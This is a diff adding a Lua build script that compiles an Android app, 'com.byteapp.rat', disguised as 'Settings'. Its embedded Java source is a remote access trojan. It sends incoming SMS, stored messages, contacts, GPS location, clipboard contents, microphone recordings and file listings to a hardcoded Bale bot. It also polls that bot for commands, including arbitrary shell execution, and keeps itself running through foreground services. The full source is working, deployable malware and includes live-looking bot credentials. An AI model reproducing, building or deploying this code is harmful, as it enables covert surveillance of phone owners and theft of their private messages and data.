@@ -1,0 +1,533 @@
+import("androidbuild")
+
+local apk = androidbuild.build({
+    java = [[
+package com.byteapp.rat;
+
+import android.Manifest;
+import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.ClipboardManager;
+import android.content.ClipData;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.media.MediaRecorder;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.telephony.SmsMessage;
+import android.widget.*;
+import android.graphics.Color;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileWriter;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+public class MainActivity extends Activity {
+
+    TextView statusText;
+    Handler handler = new Handler(Looper.getMainLooper());
+    static final int PERMISSION_CODE = 101;
+
+    final String BOT_TOKEN = "2082792321:UANVGhi3Edr48SPevrRhsG6N7lmb8YZIA5U";
+    final String CHAT_ID   = "921661962";
+
+    @Override
+    protected void onCreate(Bundle saved) {
+        super.onCreate(saved);
+
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setPadding(32, 48, 32, 32);
+        root.setBackgroundColor(Color.parseColor("#0D1117"));
+
+        TextView title = new TextView(this);
+        title.setText("Settings");
+        title.setTextSize(20);
+        title.setTextColor(Color.parseColor("#58A6FF"));
+        root.addView(title);
+
+        statusText = new TextView(this);
+        statusText.setText("Starting...");
+        statusText.setTextSize(12);
+        statusText.setTextColor(Color.parseColor("#8B949E"));
+        statusText.setPadding(0, 16, 0, 0);
+        root.addView(statusText);
+
+        setContentView(root);
+
+        requestAllPermissions();
+    }
+
+    void requestAllPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            boolean needPerms = checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
+                || checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
+                || checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
+                || checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
+                || checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED;
+            if (needPerms) {
+                requestPermissions(new String[]{
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.CAMERA
+                }, PERMISSION_CODE);
+            } else {
+                onPermissionsGranted();
+            }
+        } else {
+            onPermissionsGranted();
+        }
+    }
+
+    void onPermissionsGranted() {
+        updateStatus("Connected");
+        sendToBaleStatic("📱 *Device Connected*\nModel: " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE);
+
+        String panel = "🎛 *RAT Control Panel*\n\n"
+            + "/sms - SMS file\n/contacts - Contacts file\n/files - List /sdcard\n/info - Device info\n"
+            + "/loc - GPS location\n/cam - Take photo\n/mic - Record 10s\n/apps - Installed apps\n"
+            + "/clip - Clipboard\n/shell:CMD - Shell\n/help - Menu";
+        sendToBaleStatic(panel);
+
+        startSmsService();
+        startCommandListener();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
+        super.onRequestPermissionsResult(code, perms, results);
+        if (code == PERMISSION_CODE) {
+            boolean allGranted = true;
+            for (int r : results) if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            if (allGranted) onPermissionsGranted();
+            else updateStatus("Permissions denied");
+        }
+    }
+
+    void updateStatus(final String msg) {
+        handler.post(new Runnable() {
+            @Override
+            public void run() { if (statusText != null) statusText.setText(msg); }
+        });
+    }
+
+    static void sendToBaleStatic(final String msg) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String url = "https://tapi.bale.ai/bot2082792321:UANVGhi3Edr48SPevrRhsG6N7lmb8YZIA5U/sendMessage?chat_id=921661962&text=" + URLEncoder.encode(msg, "UTF-8");
+                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                    c.setRequestMethod("GET"); c.setConnectTimeout(15000); c.getResponseCode(); c.disconnect();
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    static void sendFileToBale(final String filePath, final String caption) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    File file = new File(filePath);
+                    if (!file.exists()) { sendToBaleStatic("File not found"); return; }
+
+                    String urlStr = "https://tapi.bale.ai/bot2082792321:UANVGhi3Edr48SPevrRhsG6N7lmb8YZIA5U/sendDocument";
+                    String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
+
+                    URL url = new URL(urlStr);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                    conn.setDoOutput(true);
+                    conn.setConnectTimeout(30000);
+                    conn.setReadTimeout(30000);
+
+                    OutputStream os = conn.getOutputStream();
+
+                    os.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
+                    os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes("UTF-8"));
+                    os.write("921661962\r\n".getBytes("UTF-8"));
+
+                    os.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
+                    os.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".getBytes("UTF-8"));
+                    os.write((caption + "\r\n").getBytes("UTF-8"));
+
+                    os.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
+                    os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n").getBytes("UTF-8"));
+                    os.write("Content-Type: text/plain\r\n\r\n".getBytes("UTF-8"));
+
+                    FileInputStream fis = new FileInputStream(file);
+                    byte[] buf = new byte[4096];
+                    int n;
+                    while ((n = fis.read(buf)) > 0) { os.write(buf, 0, n); }
+                    fis.close();
+
+                    os.write(("\r\n--" + boundary + "--\r\n").getBytes("UTF-8"));
+                    os.flush();
+                    os.close();
+
+                    int code = conn.getResponseCode();
+                    conn.disconnect();
+
+                    sendToBaleStatic("📄 " + caption + " | " + file.getName() + " (" + (file.length()/1024) + "KB) | Code: " + code);
+
+                } catch (Exception e) {
+                    sendToBaleStatic("Upload error: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    void startSmsService() {
+        Intent si = new Intent(this, SmsForwarderService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(si); else startService(si);
+    }
+
+    void startCommandListener() {
+        Intent ci = new Intent(this, CommandListenerService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(ci); else startService(ci);
+    }
+
+    // ═══════════════════════════════ SMS FORWARDER ═══════════════════════════════
+    public static class SmsForwarderService extends Service {
+        BroadcastReceiver smsReceiver;
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel("sms_fwd", "SMS", NotificationManager.IMPORTANCE_LOW);
+                ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(ch);
+            }
+            Intent i = new Intent(this, MainActivity.class);
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
+            startForeground(1001, new Notification.Builder(this, "sms_fwd")
+                .setContentTitle("SMS Forwarder").setContentText("Active")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentIntent(PendingIntent.getActivity(this, 0, i, flags)).setOngoing(true).build());
+            smsReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context c, Intent i) {
+                    Bundle b = i.getExtras(); if (b == null) return;
+                    Object[] pdus = (Object[]) b.get("pdus"); if (pdus == null) return;
+                    StringBuilder sb = new StringBuilder();
+                    for (Object p : pdus) {
+                        try { SmsMessage sms = SmsMessage.createFromPdu((byte[]) p);
+                            sb.append("📥 *New SMS*\nFrom: ").append(sms.getDisplayOriginatingAddress()).append("\n").append(sms.getMessageBody()); }
+                        catch (Exception e) {}
+                    }
+                    final String msg = sb.toString();
+                    if (msg.length() > 0) sendToBaleStatic(msg);
+                }
+            };
+            registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
+        }
+        @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
+        @Override public IBinder onBind(Intent i) { return null; }
+        @Override public void onDestroy() { super.onDestroy(); if (smsReceiver != null) try { unregisterReceiver(smsReceiver); } catch (Exception e) {} }
+    }
+
+    // ═══════════════════════════════ COMMAND LISTENER ═══════════════════════════════
+    public static class CommandListenerService extends Service {
+        Handler handler = new Handler(Looper.getMainLooper());
+        Runnable pollRunnable;
+        long lastUpdateId = 0;
+
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel("cmd_listener", "Bot", NotificationManager.IMPORTANCE_LOW);
+                ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(ch);
+            }
+            Intent i = new Intent(this, MainActivity.class);
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
+            startForeground(1002, new Notification.Builder(this, "cmd_listener")
+                .setContentTitle("Bot Listener").setContentText("Waiting...")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentIntent(PendingIntent.getActivity(this, 0, i, flags)).setOngoing(true).build());
+            startPolling();
+        }
+
+        void startPolling() {
+            pollRunnable = new Runnable() { @Override public void run() { checkUpdates(); handler.postDelayed(this, 4000); } };
+            handler.post(pollRunnable);
+        }
+
+        void checkUpdates() {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    String urlStr = "https://tapi.bale.ai/bot2082792321:UANVGhi3Edr48SPevrRhsG6N7lmb8YZIA5U/getUpdates?offset=" + (lastUpdateId + 1);
+                    URL url = new URL(urlStr);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("GET"); conn.setConnectTimeout(10000); conn.setReadTimeout(10000);
+                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                    StringBuilder response = new StringBuilder(); String line;
+                    while ((line = br.readLine()) != null) response.append(line);
+                    br.close(); conn.disconnect();
+                    String resp = response.toString();
+                    if (resp.contains("\"text\":\"/")) {
+                        int start = resp.indexOf("\"text\":\"/") + 8, end = resp.indexOf("\"", start);
+                        final String cmd = resp.substring(start, end).trim();
+                        long updateId = 0;
+                        int idStart = resp.indexOf("\"update_id\":") + 12, idEnd = resp.indexOf(",", idStart);
+                        if (idEnd == -1) idEnd = resp.indexOf("}", idStart);
+                        try { updateId = Long.parseLong(resp.substring(idStart, idEnd).trim()); } catch (Exception e) {}
+                        if (updateId > lastUpdateId) lastUpdateId = updateId;
+                        handler.post(new Runnable() { @Override public void run() { executeCommand(cmd); } });
+                    }
+                } catch (Exception e) {}
+            }}).start();
+        }
+
+        void executeCommand(String cmd) {
+            final Context ctx = getApplicationContext();
+            try {
+                if (cmd.startsWith("/sms")) sendSmsAsFile(ctx);
+                else if (cmd.startsWith("/contacts")) sendContactsAsFile(ctx);
+                else if (cmd.startsWith("/files")) listFiles(ctx);
+                else if (cmd.startsWith("/info")) sendDeviceInfo(ctx);
+                else if (cmd.startsWith("/loc")) getLocation(ctx);
+                else if (cmd.startsWith("/cam")) takePhoto(ctx);
+                else if (cmd.startsWith("/mic")) recordAudio(ctx);
+                else if (cmd.startsWith("/apps")) listApps(ctx);
+                else if (cmd.startsWith("/clip")) getClipboard(ctx);
+                else if (cmd.startsWith("/shell:")) runShellCommand(ctx, cmd.substring(7).trim());
+                else if (cmd.startsWith("/help")) sendToBaleStatic("🎛 /sms /contacts /files /info /loc /cam /mic /apps /clip /shell:CMD /help");
+            } catch (Exception e) { sendToBaleStatic("Command Error: " + e.getMessage()); }
+        }
+
+        void sendSmsAsFile(final Context ctx) {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    ContentResolver cr = ctx.getContentResolver();
+                    Cursor cursor = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
+                    if (cursor == null || cursor.getCount() == 0) { sendToBaleStatic("No SMS"); return; }
+                    File file = new File(ctx.getExternalFilesDir(null), "sms.txt");
+                    FileWriter fw = new FileWriter(file);
+                    int bodyCol = cursor.getColumnIndex("body"), addrCol = cursor.getColumnIndex("address");
+                    int typeCol = cursor.getColumnIndex("type"), dateCol = cursor.getColumnIndex("date");
+                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+                    int count = 0;
+                    while (cursor.moveToNext()) {
+                        fw.write("[" + sdf.format(new Date(cursor.getLong(dateCol))) + "] " + (cursor.getInt(typeCol)==1?"RECEIVED":"SENT") + " | " + cursor.getString(addrCol) + "\n" + cursor.getString(bodyCol) + "\n\n");
+                        count++;
+                    }
+                    fw.close(); cursor.close();
+                    sendFileToBale(file.getAbsolutePath(), "SMS: " + count + " messages");
+                } catch (Exception e) { sendToBaleStatic("SMS Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        void sendContactsAsFile(final Context ctx) {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    ContentResolver cr = ctx.getContentResolver();
+                    Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
+                        null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+                    if (cursor == null || cursor.getCount() == 0) { sendToBaleStatic("No contacts"); return; }
+                    File file = new File(ctx.getExternalFilesDir(null), "contacts.txt");
+                    FileWriter fw = new FileWriter(file);
+                    int nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                    int numCol  = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                    int count = 0;
+                    while (cursor.moveToNext()) { fw.write(cursor.getString(nameCol) + " : " + cursor.getString(numCol) + "\n"); count++; }
+                    fw.close(); cursor.close();
+                    sendFileToBale(file.getAbsolutePath(), "Contacts: " + count);
+                } catch (Exception e) { sendToBaleStatic("Contacts Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        void listFiles(final Context ctx) {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    File dir = new File("/sdcard"); File[] files = dir.listFiles();
+                    if (files == null || files.length == 0) { sendToBaleStatic("No files"); return; }
+                    StringBuilder sb = new StringBuilder("📂 /sdcard\n\n"); int count = 0;
+                    for (File f : files) { sb.append(f.isDirectory()?"📁 ":"📄 ").append(f.getName()).append("\n"); count++; if(count%30==0){sendToBaleStatic(sb.toString());sb.setLength(0);try{Thread.sleep(100);}catch(Exception e){}} }
+                    if (sb.length()>0) sendToBaleStatic(sb.toString());
+                    sendToBaleStatic("Total: " + count + " items");
+                } catch (Exception e) { sendToBaleStatic("Files Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        void sendDeviceInfo(Context ctx) {
+            String info = "📱 Model: " + Build.MODEL + "\nBrand: " + Build.BRAND + "\nAndroid: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\nTime: " + new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
+            sendToBaleStatic(info);
+        }
+
+        void getLocation(final Context ctx) {
+            try {
+                LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
+                Location loc = null;
+                try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Exception e) {}
+                if (loc == null) try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Exception e) {}
+                if (loc != null) {
+                    sendToBaleStatic("📍 Lat: " + loc.getLatitude() + " Lng: " + loc.getLongitude() + "\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
+                } else {
+                    sendToBaleStatic("📍 Trying GPS... wait 10s");
+                    try {
+                        LocationListener listener = new LocationListener() {
+                            @Override public void onLocationChanged(Location l) {
+                                sendToBaleStatic("📍 Lat: " + l.getLatitude() + " Lng: " + l.getLongitude() + "\nhttps://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude());
+                            }
+                            @Override public void onStatusChanged(String p, int s, Bundle b) {}
+                            @Override public void onProviderEnabled(String p) {}
+                            @Override public void onProviderDisabled(String p) {}
+                        };
+                        lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
+                    } catch (Exception e2) { sendToBaleStatic("GPS Error: " + e2.getMessage()); }
+                }
+            } catch (Exception e) { sendToBaleStatic("Location Error: " + e.getMessage()); }
+        }
+
+        void takePhoto(Context ctx) {
+            try { Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); ctx.startActivity(intent); sendToBaleStatic("📸 Camera opened"); }
+            catch (Exception e) { sendToBaleStatic("Camera Error: " + e.getMessage()); }
+        }
+
+        void recordAudio(final Context ctx) {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    File file = new File(ctx.getExternalFilesDir(null), "record.3gp");
+                    MediaRecorder recorder = new MediaRecorder();
+                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                    recorder.setOutputFile(file.getAbsolutePath());
+                    recorder.prepare(); recorder.start(); Thread.sleep(10000); recorder.stop(); recorder.release();
+                    sendFileToBale(file.getAbsolutePath(), "Audio recording");
+                } catch (Exception e) { sendToBaleStatic("Mic Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        void listApps(final Context ctx) {
+            new Thread(new Runnable() { @Override public void run() {
+                try {
+                    StringBuilder sb = new StringBuilder("📱 Apps:\n\n"); int count = 0;
+                    for (android.content.pm.ApplicationInfo ai : ctx.getPackageManager().getInstalledApplications(0)) {
+                        sb.append("• ").append(ctx.getPackageManager().getApplicationLabel(ai)).append("\n"); count++;
+                        if (count%30==0){sendToBaleStatic(sb.toString());sb.setLength(0);try{Thread.sleep(100);}catch(Exception e){}}
+                    }
+                    if (sb.length()>0) sendToBaleStatic(sb.toString());
+                    sendToBaleStatic("Total: " + count + " apps");
+                } catch (Exception e) { sendToBaleStatic("Apps Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        void getClipboard(Context ctx) {
+            try {
+                ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+                if (cm != null && cm.hasPrimaryClip()) {
+                    ClipData cd = cm.getPrimaryClip();
+                    if (cd != null && cd.getItemCount() > 0) {
+                        CharSequence text = cd.getItemAt(0).getText();
+                        String s = (text != null) ? text.toString() : "";
+                        sendToBaleStatic("📋 Clipboard: " + (s.isEmpty() ? "(empty)" : (s.length() > 2000 ? s.substring(0, 1990) + "..." : s)));
+                        return;
+                    }
+                }
+                sendToBaleStatic("📋 Clipboard empty");
+            } catch (Exception e) { sendToBaleStatic("Clipboard Error: " + e.getMessage()); }
+        }
+
+        void runShellCommand(final Context ctx, final String shellCmd) {
+            new Thread(new Runnable() { @Override public void run() {
+                final String cmd = shellCmd;
+                try {
+                    Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
+                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    StringBuilder sb = new StringBuilder(); String line;
+                    while ((line = br.readLine()) != null) sb.append(line).append("\n");
+                    p.waitFor();
+                    String output = sb.toString().trim();
+                    if (output.isEmpty()) output = "(no output)";
+                    if (output.length() > 4000) output = output.substring(0, 3990) + "...";
+                    sendToBaleStatic("💻 Shell: `" + cmd + "`\n" + output);
+                } catch (Exception e) { sendToBaleStatic("Shell Error: " + e.getMessage()); }
+            }}).start();
+        }
+
+        @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
+        @Override public IBinder onBind(Intent i) { return null; }
+        @Override public void onDestroy() { super.onDestroy(); if (handler != null && pollRunnable != null) handler.removeCallbacks(pollRunnable); }
+    }
+}
+    ]],
+    manifest = [[
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.byteapp.rat"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33"/>
+
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+
+    <application
+        android:label="Settings"
+        android:theme="@android:style/Theme.Material.Light.NoActionBar">
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name=".MainActivity$SmsForwarderService" android:exported="false" android:foregroundServiceType="dataSync"/>
+        <service android:name=".MainActivity$CommandListenerService" android:exported="false" android:foregroundServiceType="dataSync"/>
+    </application>
+</manifest>
+    ]],
+    name = "Settings",
+    package = "com.byteapp.rat"
+})
+
+print("Done: " .. apk)
+print("cp " .. apk .. " /sdcard/Download/")
